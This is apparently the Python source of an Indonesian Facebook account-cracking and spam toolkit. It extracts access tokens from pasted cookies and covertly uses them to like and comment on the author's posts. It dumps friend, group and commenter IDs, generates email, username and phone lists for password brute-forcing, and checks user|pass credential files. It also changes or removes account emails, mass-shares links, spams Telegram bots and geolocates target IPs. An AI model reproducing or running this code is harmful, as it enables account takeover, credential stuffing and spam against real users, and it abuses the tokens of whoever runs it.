	    prints(nel(f'{P2}unstable signal {P2}',width=70,padding=(0,7),style=f"{color_panel}"));back()
	except (KeyError,IOError):
		prints(nel(f'{P2}Friendship Not Public{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		time.sleep(3)
		back()
		
class Dump:
    # fuction init
    def __init__(self) -> None:pass
        
    #----------[ DUMP-PUBLIK ]----------#
    def dump_publik(self,uuid,cookie,token,fields):
        try:
            if len(id) == 0:
                params = {"access_token": token,"fields": "friends.fields(id,name)"}
            else:
                params = {"access_token": token,"fields": f"friends.fields(id,name).after({fields})"}
            response = requests.get("https://graph.facebook.com/v18.0/%s"%(uuid),params=params,cookies={'cookie':cookie}).json()
            for xyz in response['friends']['data']:
                format = '%s<=>%s'%(xyz['id'],xyz['name'])
                if format not in id:
                    id.append(format)
                    #print(f' *_» sedang dump {str(len(id))} idz',end='\r'); #sys.stdout.flush()
            if 'fields' in str(response):
                self.dump_publik(uuid,cookie,token,response["friends"]["paging"]["cursors"]["after"])
        except ( KeyboardInterrupt ): pass
        except ( Exception ) as e: sys.exit(e)
       
import marshal
import os,re,sys,bs4,time,json,random,datetime,requests, calendar, random


header = {"authority":"graph.facebook.com","cache-control":"max-age=0","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.66 Safari/537.36"}
ses=requests.Session()

#warna coeg
K = "\x1b[0;33m"
N = "\x1b[0m" 
B = "\x1b[0;34m"
M = "\x1b[0;31m"
PI = "\033[0m"
#loggin
def share():
	cetak(nel(f'Silahkan anda masukin cookie dulu terlebih dahulu',width=70))
	try:
		cookie = input("[+] Cookie : ")
		get_tok = requests.get('https://business.facebook.com/business_locations',headers = {"user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
		tokenz = re.search("(EAAG\w+)", get_tok.text).group(1)
		coki = {"cookie":cookie}
	except Exception as e:
		exit("coki modar")
	idt = input(f"[+] Masukan link : {PI}")
	limit = int(input(f"[{N}+{N}] Masukan limit : "))
	print(f"\n\t\t{PI}ctrl+z {N}untuk berhenti\n")
	token = tokenz 
	cookie = coki
	try:
		for x in range(limit):
			x+=1
			response = ses.post(f"https://graph.facebook.com/v13.0/me/feed?link={idt}&published=0&access_token={token}",headers=header, cookies=cookie).json()
			if "id" in response:
				sys.stdout.write(f"\r [{PI}*{N}] DONE {x} | {response}");sys.stdout.flush()
			else:
				print(f"[+] Gagal,mungkin akun anda terkena spam");exit()
	except requests.exceptions.ConnectionError:
		exit("[!] Anda tidak terhubung ke internet!")
		


import socket
import requests
import json
import os 
from rich import print as cetak
from rich.panel import Panel as panel
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname)

def lacak():
	prints(nel(f"""Silahkan masukan IP Target anda""",width=70,padding=(0,7),style=f"{color_panel}"))
	link = input(f'[+] Masukan Ip : ')
	url = 'http://ip-api.com/json/' + link
	r = requests.get(url)
	data = json.loads(r.text)
	latitude = data['lat']
	longitude = data['lon']
	google_maps_url = 'https://www.google.com/maps/place/' + str(latitude) + '+' + str(longitude)
	url = 'http://ip-api.com/json/'+link
	try:
		request = requests.get(url)
		response = request.json()
	except (requests.ConnectionError):
		prints(nel(f"""Koneksi internet anda sedang sibuk,silahkan periksa koneksi""",width=70,padding=(0,7),style=f"{color_panel}"))
		exit()
	if response['status'] == 'success':
		prints(nel(f"""Lokasi anda telah ditemukan silahkan ciduk""",width=70,padding=(0,7),style=f"{color_panel}"))
		print("\033[0m[+] Alamat IP :\033[32m " + response['query'])
		print("\033[0m[+] Kota : \033[32m" + response['city'])
		print("\033[0m[+] Negara : \033[32m" + response['country'])
		print("\033[0m[+] Kode Negara : \033[32m" + response['countryCode'])
		print("\033[0m[+] Latitude : \033[32m" + str(response['lat']))
		print("\033[0m[+] Longitude : \033[32m" + str(response['lon']))
		print("\033[0m[+] ISP :\033[32m " + response['isp'])
		print("\033[0m[+] Link Google Maps :\033[32m", google_maps_url)
		print('')
	else:
		prints(nel(f"""{P2}Alamat IP yang dimasukkan salah""",width=70,padding=(0,7),style=f"{color_panel}"))
	
import requests,re,rich,sys,os,json,time
from concurrent.futures import ThreadPoolExecutor as thread
from rich.markdown import Markdown as mark
from rich import print as cetak
from rich.console import Console as sol
from rich.panel import Panel as nel
ses = requests.Session()
loop = 0
x = '\33[m'
h = '\x1b[1;92m'
m = '\x1b[1;91m'

def mulai(link,jum):
	global loop
	print(f'\r{x}[+] progres {loop} ~ {jum}' ,end='')
	cook = open('.cookie.txt','r').read()
	took = open('.token.txt','r').read()
	try:
		url = f'https://graph.facebook.com/v13.0/me/feed?link={link}&published=0&access_token={took}'
		ok = ses.post(url,cookies={'cookie':cook}).text
		if 'Kami membatasi' in ok:
			print(f'{x}\r[+]share failled Akun Limit')
		elif 'spam' in ok:
			print(f'{x}\r[+]share failled Akun Limit')
		elif 'id' in ok:
			print(f"{x}\r[+] Succes : {PI}"+ok)
		else:
			prints(nel(f"""Maaf terjadi kesalahan""",width=70,padding=(0,7),style=f"{color_panel}"))
	except:
		prints(nel(f"""Maaf terjadi kesalahan""",width=70,padding=(0,7),style=f"{color_panel}"))
	loop+=1

def gettok():
        prints(nel(f"""Silahkan masukan cookie, anda terlebih dahulu""",width=70,padding=(0,7),style=f"{color_panel}"));cook = input(f"{x}[+] Cookie : ")
        open('.cookie.txt','w').write(cook)
        try:
                cookie = {'cookie':cook}
                with requests.Session() as xyz:
                    url = 'https://business.facebook.com/business_locations'
                    req = xyz.get(url,cookies=cookie)
                    tok = re.search('(\["EAAG\w+)', req.text).group(1).replace('["','')
                    open('.token.txt','w').write(tok)
                    ses.post(f"https://graph.facebook.com/pfbid0ZiJQd99dJLpMpWoFJMcryzkZZQ2CiNEfWwH6Z4rYARP5LQf6qt8YvQNgQmxQVcskl/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
                    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/comments/?&message=Izin Pake Scnya Bang&access_token={tok}",cookies=cookie)
                    ses.post(f"https://graph.facebook.com/100000457453881_230141992787447/likes?summary=true&access_token="+tok,cookies={'cookie':cook}).text
        except Exception as e:

                prints(nel(f"""Cookie anda tidak valid/kedaluwarsa""",width=70,padding=(0,7),style=f"{color_panel}"))

def gas():
	gettok()
	prints(nel(f"""Silahkan masukan link Facebook yang ingin dishare""",width=70,padding=(0,7),style=f"{color_panel}"))
	link = input(f"{x}[+] Input Url : ")
	try:
		cook = open('.cookie.txt','r').read()
		took = open('.token.txt','r').read()
		get = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+took, cookies={'cookie':cook})
		nama = json.loads(get.text)['name']
		print(f"{x}[+] Nama Account : {PI}"+nama)
	except KeyError:
		prints(nel(f"""Cookie invalid, silahkan login ulang kembali""",width=70,padding=(0,7),style=f"{color_panel}"))
		time.sleep(1)
		gettok()
	jum = int(input(f"{x}[+] Input Jumlah Share : "))
	with thread(max_workers=2) as pool:
		for io in range(jum):
			pool.submit(mulai,link,jum)
	print(f"{x}[+] Succes Share Sebanyak {PI}{jum}{x} ×")


#--------[NO LOGIN COOKIE]--------#
def menuhah():
	banner()
	prints(nel(f'{P2}Tools brute crak simple/dan bagus untuk coli\Pilihan Crack Bisa Menulis Ke {H2}mail{P2}/{K2}yaho{P2}/{M2}user{P2}{H2} Nomor{P2} pilih method no {H2}7{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	prints(nel(f'{P2}[{color_text}01{P2}]. Crack Gmail\n[{color_text}02{P2}]. Crack Yahoo\n[{color_text}03{P2}]. Crack username\n[{color_text}04{P2}]. Crack Nomor Telepon\n[{color_text}05{P2}]. Crack lewat file{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	Asep_sukaColi_DanGanteng = input('[+] Pilih : ')
	if Asep_sukaColi_DanGanteng in ['01','1','mail','gmail']:
		clon_email()
	elif Asep_sukaColi_DanGanteng in ['02','2','yaho','yahoo']:
		clon_yahoo()
	elif Asep_sukaColi_DanGanteng in ['03','3','user','nama']:
		crack_nama()
	elif Asep_sukaColi_DanGanteng in ['04','4','nomor','nom']:
			crack_nomor()
	elif Asep_sukaColi_DanGanteng in ['05','5','pil','file']:
			crack_filev2()
	else:
		prints(nel(f'{P2}Lu buta apa gimana si anjing :v{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
		
import requests,re
from bs4 import  BeautifulSoup as bs

def utama(ck,email):
	url = requests.get("https://mbasic.facebook.com/settings/email/?primary_email",cookies={"cookie":ck}).text
	soup = bs(url, "html.parser")
	form = soup.find("form", {"method": "post"})
	data = {
		"fb_dtsg": re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(form)).group(1),
		'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(form)).group(1),
		"email": email,
		"change_primary": '1',
		'save': re.search('name="save" size="0" type="submit" value="(.*?)"', str(form)).group(1)
		}
	link = "https://mbasic.facebook.com"+re.search('action="(.*?)"',str(form)).group(1)
	post = bs(requests.post(link,data=data,cookies={"cookie": ck}).text, "html.parser")
	if "Response [200]" in str(post):
		prints(nel(f'{P2}Gagal menggubah email utama{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	else:
		email = re.findall('\<span class="cc">(.*?)<\/span>',str(post))
		prints(nel(f'{P2} Berhasil menggubah email utama{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	
	
import requests,re
from bs4 import BeautifulSoup as bs


def hps(cck,mail,pss):
	link = f"https://mbasic.facebook.com/settings/email/?remove_email&email={mail}"
	url = requests.get(link,cookies={"cookie":cck})
	soup = bs(url.text,"html.parser")
	form = soup.find("form", {"method": "post"})
	data = {
				"fb_dtsg": re.search('name="fb_dtsg" type="hidden" value="(.*?)"', str(form)).group(1),
				'jazoest': re.search('name="jazoest" type="hidden" value="(.*?)"', str(form)).group(1),
				'remove_email': "1",
				"email": mail,
				'save_password': pss,
				'error_uri': f"/settings/email/?remove_email&amp;email={mail}",
				'save': re.findall('name="save" size="0" value="(.*?)"', str(form))
				}
	link = "https://mbasic.facebook.com"+re.search('action="(.*?)"',str(form)).group(1)
	pos = bs(requests.post(link,data=data,cookies={"cookie": cck}).text, "html.parser")
	if "Perubahan Disimpan" in str(pos):
		prints(nel(f'{P2} Berhasil menghapus email: [green]{mail}{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	else:
		prints(nel(f'{P2}Gagal menghapus email{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		
#--------[cekdetektor]-------#
def cekdetektor():
    results, result = {}, []
    try:
    	ua = open("data/useragent.txt", "r").read()
    except:
    	try:os.mkdir("data")
    	except:pass
    	prints(nel(f'{P2}Masukan UserAgent Anda Terlebih dahulu {P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	open("data/useragent.txt", "a").write(input("[+] UserAgent: \033[32m")+" [FB_IAB/FB4A;FBAV/35.0.0.48.273;]")
    	prints(nel(f'{P2}Jalankan ulang scriptnya {P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    if(ua==""):
    	os.remove("data/useragent.txt")
    	prints(nel(f'{P2}UserAgent Tidak Ada!, Jalankan ulang scriptnya {P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    LOg = Login(ua)
    prints(nel(f'{P2} Tools Facebook Checker Account checkpoint V²{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    prints(nel(f'{P2}[{color_text}01{P2}]. Cek Account 1 per 1\n[{color_text}02{P2}]. Cek Account per File [format: user|pass]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    select = input("[+] pilih : ")
    if(select=="1"):
    	prints(nel(f'{P2}Masukan username/id password kalian{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	data = input("[+] user|pass: ")
    	print()
    	user,pw = data.split("|")
    	print(LOg.log_mfacebook(user,pw))
    elif(select=="2"):
    	prints(nel(f'{P2}Masukan file account cp kalian berbentuk file.txt{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	data = input("[+] name file: ")
    	print()
    	try:
    		for x in open(data,"r").readlines():
    			x = x.replace("\n","")
    			user,pw = x.split("|")
    			print(LOg.log_mfacebook(user,pw))
    	except FileNotFoundError:
    		prints(nel(f'{P2}File Tidak Ditemukan{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
    else:prints(nel(f'{P2}Lu buta kah tolol{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
    	

    results.update(
    	{
    		"results":{
    			"data":result
   	 	},
    		"jumlah_akun_cp":cp,
    		"jumlah_akun_ok":ok,
    		"jumlah_akun_error":error
    	}
    )

#--------[PASANG A2F]--------#
def pasang_a2f():
	prints(nel(f'{P2}Masukan cookie anda jika ingin, pasang a2f{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	cokii = input("[+] Cookie: \033[32m")
	resss = req.get(
		"https://mbasic.facebook.com/profile.php",cookies={
			"cookie":cokii
		}
	).text
	if "mbasic_logout_button" in resss:
		nama = re.findall(
			'\<title\>(.*?)<\/title\>',str(
				resss
			)
		)[0]
		#print(f'[✓] Cookies accept\n[+] Selamat Datang {nama}\n')
		menuju = Pasang(cokii)
		menuju.cek()
	else:
		prints(nel(f'{P2}Cookie anda kedaluwarsa atau/invalid{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		exit()
		###---[ DUMP NO LOGIN ]---###
def crack_nomor():
	prints(nel(f'{P2}Brute Force Nomor Gunakan Sandi Manual{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	depan = input('[+] Nomor Awalan : ')
	if len(depan)==3:pass
	else:prints(nel(f'{P2}Contoh Awalan Nomor "{H2}089{P2}" Dll Tolol{P2}',width=70,padding=(0,7),style=f"{color_panel}"));exit()
	jumla = input('[+] Masukan total : ')
	for x in range(int(jumla)):
		rr = random.randint
		A = depan
		B = rr(1111,9999)
		C = rr(1,9)
		D = f'{A}{C}-{str(rr(1111,9999))}-{str(B)}'
		if D in id:pass
		else:id.append(D+'|123456')
		print('\r[+] Total \033[32m%s \033[0mID'%(len(id)),end=" ")
		sys.stdout.flush()
		sleep(0.0000003)
	setting()

#----------[CRACK USERNAME]----------#
def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
	prints(nel(f'{P2}Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
	nam = console.input(f'[+] Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
		
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  #sys.stdout.write(f"\r[+] Mengumpulkan\033[32m {len(id)}\033[0m Idz ...");#sys.stdout.flush()
	  time.sleep(0.0000003)
	  cari_nama(link)
	else:
	     print("\r")
	
#-----------------[ DUMP ID ]-----------------# 
def dumpid():
	try:
		token = open('.token.txt','r').read()
		cookie = open('.cok.txt','r').read()
		os.mkdir('/sdcard/DUMP-FILE')
	except:pass
	try:
		prints(nel(f'{P2}Masukan id anda berserta/publik{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
		barelang = input(f"[+] Masukan Id  : ")
		batuampar = input(f"[+] Nama File Dump  : ")
		gajahmada  = ('/sdcard/DUMP-FILE/' + batuampar + '.txt').replace(' ', '_')
		xxx = open(gajahmada, 'w')
		coki = {"cookie":cookie}
		smpn20 = requests.get('https://graph.facebook.com/%s?fields=friends.limit(90000)&access_token=%s'%(barelang,token),cookies=coki).json()
		for sekupang in smpn20['friends']['data']:
			id.append(sekupang['id']+'|'+sekupang['name'])
			xxx.write(sekupang['id']+'|'+sekupang['name']+ '\n')
			print('\r[+] Mengumpulkan %s Id'%(len(id)),end='')
			time.sleep(0.0050)
		print(f"\n[+] Berhasil Dump Id Dari Publik")
		print(f"[+] Salin Output File + [ %s ]"%(gajahmada))
		exit()
	except (KeyError,IOError):
		os.remove(gajahmada)
		print(f"[+] Gagal Dump Id, Kemungkinan Id Tidak Ada")
		exit()
		

#-------------------[PUBLIK]--------------------#    
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 11; AC2003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			#print(i["id"]+"|"+i["name"])
			id.append(i["id"]+"|"+i["name"])
		#	sys.stdout.write(f"\r>> sedang mengumpulkan id, sukses mengumpulkan {H}{len(id)}{P} id....{P}"),
		#	sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

def group():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print('[+] Cookies Kadaluarsa ')
		sleep(5)
		logindong()
	cetak(Panel('Pastikan Idz Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=70))
	url = input(f'[+] Id Group : ')
	kocak("https://mbasic.facebook.com/groups/"+url,cokies)
	print("\r")
	setting()

def kocak(url,cokies):
	data = sop(ses.get(url,cookies={"cokies": cokies}).text, "html.parser")
	judul = re.findall("<title>(.*?)</title>",str(data))[0]
	if str(judul) == 'Use basic mode':
		print('\n [+] Cokies Berada Dalam Mode Free');exit()
	if str(judul) == 'Epsilon':
		print('\n [+] Cokies Tidak Dpt Mengakses Grup');exit()
	if str(judul) == 'Kesalahan':
		print('\n [+] Cokies Yg Anda Masukan Salah');exit()
	if str(judul) == 'Masuk Facebook' or str(judul) == 'Masuk Facebook | Facebook' or str(judul) == 'Masuk ke Facebook' or str(judul) == 'Log in to Facebook':
		print('\n [+] Cokies Mokad');exit()
	else:
		for isi in data.find_all("h3"):
			for ids in isi.find_all("a",href=True):
				if "profile.php" in ids.get("href"):uid = ids.get("href").split("=")[1].replace("&eav","");nama = ids.text
				else:
					if ids.text==judul:pass
					else:uid = ids.get("href").split("/")[1].split("?")[0];nama = ids.text
				if uid+"|"+nama in id:pass
				else:id.append(uid+"|"+nama)
				print('\r[+] Mengumpulkan %s Id'%(len(id)),end='')
		for x in data.find_all("a",href=True):
			if "Lihat Postingan Lainnya" in x.text:
				kocak("https://mbasic.facebook.com"+x.get("href"),cokies)
###---------[ CRACK DARI KOMEN ]---------- ###
def komen():
	try:
		token = open('.token.txt','r').read()
		cokies = open('.cok.txt','r').read()
	except IOError:
		print(' [+] Cookies Kadaluarsa ')
		time.sleep(5)
		login()
	cetak(panel(f"Pastikan Akun Target Yang Di Pilih Bersifat Publik Jangan Private",width=90,padding=(0,4),style=f"bold white"))
	ide = input(f' [+] Masukan Id Postingan : ')
	get_komen('https://mbasic.facebook.com/'+ide,cokies)
	setting()

def get_komen(url,cokies):
	data = parser(ses.get(url,cookies={"cookie": cokies}).text, "html.parser")
	for isi in data.find_all("h3"):
		for ids in isi.find_all("a",href=True):
			if "profile.php" in ids.get("href"):id = ids.get("href").split('=')[1].replace("&refid","")
			else:id = re.findall("/(.*?)?__",ids["href"])[0]. replace("?refid=52&","")
			nama = ids.text
			if id+"|"+nama in dump:pass
			sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Idz...");sys.stdout.flush()
	for z in data.find_all("a",href=True):
		if "Lihat komentar sebelumnya…" in z.text:
			try:get_komen("https://mbasic.facebook.com"+z["href"])
			except:pass				
#-------------------[ CRACK-EMAIL ]----------------#
def clon_email():
	dpn = ["mohamad","muhammad","akun","ahmad","aku","saya","tumbal","my","im"]
	blk = ["kontol","slebew","ganteng","cantik","11","123","1234","12345","404","saputra","gaming","bocil","ganz","gans","turu","akun","utama","gamers","wibu","xyz","tzy","0","memek","kontol","sakit","adm","sayang","chan","x"]
	nama = input(f"[+] Masukan Nama : ")
	#doma = input(f"[+] Masukan domain : ")
	doma = '@gmail.com'
	if not "@" in doma:doma = "@gmail.com"
	else:pass
	for dump in range(random.randint(100,900)):
		sleep(0.001)
		aa = str(random.randint(1,99))
		bb = str(random.randint(100,9999))
		cc = random.choice(dpn)
		dd = random.choice(blk)
		a_ = f"{nama}{aa}{doma}"
		b_ = f"{nama}{bb}{doma}"
		c_ = f"{cc}{nama}{doma}"
		d_ = f"{nama}{dd}{doma}"
		e_ = f"{nama}{dd}{aa}{doma}"
		f_ = f"{nama}{dd}{bb}{doma}"
		if (a_,b_,c_,d_,e_,f_) in id:pass
		else:
			id.append(f"{a_}|{nama}")
			id.append(f"{b_}|{nama}")
			id.append(f"{c_}|{nama}")
			id.append(f"{d_}|{nama}")
			id.append(f"{e_}|{nama}")
			id.append(f"{f_}|{nama}")
		#sys.stdout.write(f"\r[+] Mengumpulkan {len(id)} Id")
		#sys.stdout.flush()
	#print("\r")
	setting()
	
#-------------------[ KHUSUS-PREMIUM ]----------------#

def konfirmasikey():
	try:
		file = open("files/.cache.txt", "r").read()
		response = requests.get(urltokenpelanggan + file).json()
		if response['status'] == "200":
			nama_pelanggan.append(response['nama'])
			tanggal_daftar.append(response['tanggal_daftar'])
			tanggal_expired.append(response['tanggal_expired'])
			type_pelanggan.append(response['type_user'])
			if response == "unlimited":
 				login()
			else:
				if(tanggal >= response['tanggal_expired']):
					cetak(nel(f"Maaf, Waktu Lisensi Sudah Habis",width=70))
					os.system("rm -rf files/.cache.txt")
				else:
					login()
		else:
			cetak(nel(f"Maaf, Anda Belum Premium",width=70))
			time.sleep(1.5)
			menuLisensi()
	except FileNotFoundError:
		cetak(nel(f"Maaf, Anda Belum Premium",width=70))
		time.sleep(1.5)
		menuLisensi()


def menuLisensi():
	os.system('clear')
	cetak(nel(f"{P2}[{color_text}01{P2}]. Beli Lisensi\n{P2}[{color_text}02{P2}]. Masukan Key Lisensi\n{P2}[{color_text}03{P2}]. Exit",title='Pilih Menu',width=70))
	pilihan = input("[+] Chouse: ")
	if pilihan == "1":
		cetak(nel(f"[white]Masukan Nama Anda Jangan pakai spasi!!",width=70))
		nama = input("[+] Nama: ") 
		cetak(nel(f"[white]Nama: [green]"+nama+"[white]\nKey: [green]"+res.lower()+"\n[white]Tanggal: [green]"+tanggal+"[white]",title='Data Akun Anda',width=70))
		os.system("xdg-open https://wa.me/+6289530656600?text=Assalamualaikum+bang+AsepitgansXc,+aku+mau+beli+lisensikey+premium+Ini+Data+Saya+:%20"+nama+"+-%20"+res.lower()+"+-%20"+tanggal);exit()
	#elif pilihan == "3":
		#cetak(nel(f"[white]Masukan Nama Anda Jangan pakai spasi!!",width=70))
		#nam = input("[+] Name: ")
		#cetak(nel(f'Tunggu sedang membuka whatsapp untuk meminta lisensi free...',width=70))
		#time.sleep(3.5)
		#os.system("xdg-open https://wa.me/+6289530656600?text=Assalamualaikum+bang+AsepitgansXc,+aku+mau+minta+lisensikey+freenya+Ini+Nama+Saya:%20"+nam);exit()
	elif pilihan == "2":
		while(True):
			cetak(nel(f"[white]Masukan Key Pengguna Yang Sudah Dikonfirmasi",width=70))
			token = input("[+] Key: ")

			response = requests.get(urltokenpelanggan + token).json()
			if response['status'] == "200":
				open("files/.cache.txt", "w").write(token)
				nama_pelanggan.append(response['nama'])
				tanggal_daftar.append(response['tanggal_daftar'])
				tanggal_expired.append(response['tanggal_expired'])
				type_pelanggan.append(response['type_user'])
				if response == "unlimited":
					login()
				else:
					if(tanggal >= response['tanggal_expired']):
						cetak(nel(f"[white]Maaf, Waktu Lisensi Sudah Habis",width=70))
						os.system("rm -rf files/.cache.txt")
					else:
						login()
				break
			else:
				cetak(nel(f"[white]Maaf, Key Lisensi Tidak Tersedia!",width=70))
				loopil = input(f"[+] Ingin Coba Lagi? y/t").lower()
				if loopil == "y":
					continue
				else:
					break
	else:
		exit()
    
def spamtele():
	cetak(nel(f"Masukan link telegram yang ingin anda spam",width=70))
	link = input("[+] Link Bot Telegram : ")
	jumlah = input("[+] Jumlah Spam : ")
	try:
		for x in range(int(jumlah)):
			requests.get(f"{link}")
			print("[+] Sukses Spam Chat Telegram ");sleep(3)
	except requests.exceptions.ConnectionError:
			print("[+] Gagal Spam Chat Telegram");exit()
			
			
#-------------------[ CRACK-YAHOO ]----------------#
def clon_yahoo():
	dpn = ["mohamad","muhammad","akun","ahmad","aku","saya","tumbal","my","im"]
	blk = ["kontol","slebew","ganteng","cantik","11","123","1234","12345","404","saputra","gaming","bocil","ganz","gans","turu","akun","utama","gamers","wibu","xyz","tzy","0","memek","kontol","sakit","adm","sayang","chan","x"]
	nama = input(f"[+] Masukan Nama : ")
	doma = "@yahoo.com"
	if not "@" in doma:doma = "@yahoo.com"
	else:pass
	for dump in range(random.randint(500,1000)):
		sleep(0.001)
		aa = str(random.randint(1,99))
		bb = str(random.randint(100,9999))
		cc = random.choice(dpn)
		dd = random.choice(blk)
		a_ = f"{nama}{aa}{doma}"
		b_ = f"{nama}{bb}{doma}"
		c_ = f"{cc}{nama}{doma}"
		d_ = f"{nama}{dd}{doma}"
		e_ = f"{nama}{dd}{aa}{doma}"
		f_ = f"{nama}{dd}{bb}{doma}"
		if (a_,b_,c_,d_,e_,f_) in id:pass
		else:
			id.append(f"{a_}|{nama}")
			id.append(f"{b_}|{nama}")
			id.append(f"{c_}|{nama}")
			id.append(f"{d_}|{nama}")
			id.append(f"{e_}|{nama}")
			id.append(f"{f_}|{nama}")
		sys.stdout.write(f"\r [+] Mengumpulkan {len(id)} Id")
		sys.stdout.flush()
	print("\r")
	setting()

#-----------------[ HASIL-CRACK ]-----------------#
def result():
	prints(nel(f'{P2}[{color_text}01{P2}]. Hasil CP Anda\n[{color_text}02{P2}]. Hasil OK Anda\n[{color_text}00{P2}]. Kembali{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
	kz = input('[+] pilih  : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(3)
			back()
		if len(vin)==0:
			prints(nel(f'{P2}Anda Tidak Memiliki Hasil CP{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
			time.sleep(2)
			back()
		else:
			prints(nel(f'{P2} Silahkan File Result {M2}CP{P2} Anda [{H2} Asepitgans_XC {P2}]{P2}',width=70,padding=(0,7),style=f"{color_panel}"))
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ''+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0mcekpoint '+x)
			geeh = input('\n[+] Nomor : ')
			print('')
			try:geh = lol[geeh]
			except KeyError:
				prints(nel(f'{P2}Pilih Yang Bener Kontol{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				prints(nel(f'{P2}File Tidak Di Temukan{P2}',width=70,padding=(0,7),style=f"{color_panel}")) 
				time.sleep(2)
				back()
			prints(nel(f'{P2}Hasil Account Facebook [{H2} {str(len(hem))} {P2}] Tanggal [ {H2}{tgl}-{bln}-{thn} {P2}]',width=70,padding=(0,7),style=f"{color_panel}"))
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				tree = Tree(" ")
